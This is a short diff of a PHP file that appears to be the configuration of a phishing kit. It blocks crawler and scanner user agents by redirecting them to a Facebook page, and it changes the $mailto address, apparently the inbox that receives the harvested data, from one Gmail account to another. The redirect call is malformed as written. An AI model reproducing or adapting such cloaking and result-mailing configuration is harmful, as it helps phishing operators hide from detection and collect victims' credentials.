@@ -5,5 +5,5 @@ if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si
 header('https://www.facebook.com/ensikology.id');
 die();
 }
-$mailto = "ensikology@gmail.com";
+$mailto = "alifrasyidf@gmail.com";
 ?>
